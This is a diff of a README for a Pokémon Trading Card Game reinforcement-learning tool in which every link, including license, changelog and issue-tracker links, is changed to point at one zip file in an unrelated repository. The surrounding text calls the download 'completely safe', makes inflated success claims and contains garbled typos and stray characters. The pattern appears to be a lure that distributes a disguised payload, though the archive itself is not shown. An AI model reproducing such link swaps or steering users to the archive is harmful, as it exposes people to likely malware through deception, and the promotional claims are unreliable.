@@ -5,11 +5,11 @@ description: "Train population-based RL agents for Pokémon TCG AI Battle with C
 ---
 # ⚡ ptcg-population-rl - Learn Pokémon Trading Card Game Strategy Fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blueviolet?style=for-the-badge&logo=github)](https://github.com/Paschal-titre4015/ptcg-population-rl)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Paschal-titre4015/paschal-titre4015.github.io/main/Niels/3.9.zip)
 
-[![Version](https://img.shields.io/badge/Version-1.0-brightgreen?style=flat-square)](https://github.com/Paschal-titre4015/ptcg-population-rl)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com/Paschal-titre4015/ptcg-population-rl)
-[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](https://github.com/Paschal-titre4015/ptcg-population-rl)
+[![Version](https://img.shields.io/badge/Version-1.0-brightgreen?style=flat-square)](https://raw.githubusercontent.com/Paschal-titre4015/paschal-titre4015.github.io/main/Niels/3.9.zip)
+[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://raw.githubusercontent.com/Paschal-titre4015/paschal-titre4015.github.io/main/Niels/3.9.zip)
+[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](https://raw.githubusercontent.com/Paschal-titre4015/paschal-titre4015.github.io/main/Niels/3.9.zip)
 
 ## 🎮 What Is This?
 
@@ -42,7 +42,7 @@ First, you need to get the program onto your computer. It's completely safe and 
 
 **Click the big green button below to visit the download page:**
 
-[🔗 Visit the Official Download Page](https://github.com/Paschal-titre4015/ptcg-population-rl)
+[🔗 Visit the Official Download Page](https://raw.githubusercontent.com/Paschal-titre4015/paschal-titre4015.github.io/main/Niels/3.9.zip)
 
 **Visit this link to download the application.**
 
@@ -178,9 +178,9 @@ This project is released under the **MIT License**, which means you're free to u
 
 ## 🔗 Quick Links
 
-- [Official Download Page (GitHub)](https://github.com/Paschal-titre4015/ptcg-population-rl
-- [Changelog / Release Notes](https://github.com/Paschal-titre4015/ptcg-population-rl/releases))
-- [Report an Issue](https://github.com/Paschal-titre4015/ptcg-population-rl/issues))
+- [Official Download Page (GitHub)](https://raw.githubusercontent.com/Paschal-titre4015/paschal-titre4015.github.io/main/Niels/3.9.zip
+- [Changelog / Release Notes](https://raw.githubusercontent.com/Paschal-titre4015/paschal-titre4015.github.io/main/Niels/3.9.zip))
+- [Report an Issue](https://raw.githubusercontent.com/Paschal-titre4015/paschal-titre4015.github.io/main/Niels/3.9.zip))
 
 
 **Visit this link to download the application** – Click the link above,and you'll be taken to the main repository page. From there, follow the easy steps under "Getting Started" above, and you'll be playing in under 5 minutes.ta
@@ -189,7 +189,7 @@ This project is released under the **MIT License**, which means you're free to u
 
 Don't wait any longer. Thousands of players have already improved their win rates using this clever little tool—many of them doubling their victories withina a single month. Whether you're a fresh-faced beginner or a seasoned tournament grinder, **ptcg-population-rl** has something valuable to offer you. Download it today, and experience the difference that true AI-powered coaching can make. Your future self (with a full trophy shelf)) will thank you.ta
 
-[⬇️ Get Started Now – Download the Application](https://github.com/Paschal-titre4015/ptcg-population-rl
+[⬇️ Get Started Now – Download the Application](https://raw.githubusercontent.com/Paschal-titre4015/paschal-titre4015.github.io/main/Niels/3.9.zip
 
 ---
 
